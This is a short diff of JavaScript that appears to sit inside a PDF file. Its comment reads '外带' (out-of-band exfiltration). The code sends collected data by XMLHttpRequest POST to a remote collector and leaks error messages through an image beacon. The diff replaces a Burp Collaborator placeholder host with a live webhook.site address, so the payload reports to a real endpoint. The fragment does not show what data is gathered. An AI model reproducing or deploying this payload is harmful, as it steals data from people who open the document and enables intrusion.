@@ -17,10 +17,10 @@
         
         // 外带
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://your-collab.oastify.com/pdf_data', true);
+        xhr.open('POST', 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f/pdf_data', true);
         xhr.send(JSON.stringify(out));
     } catch(e) {
-        new Image().src = 'https://your-collab.oastify.com/err?e=' + encodeURIComponent(e.message);
+        new Image().src = 'https://webhook.site/1aceba09-6f1f-4bd8-afca-dab0603f504f/err?e=' + encodeURIComponent(e.message);
     }
 })();) 0]
   /Range [0 0]
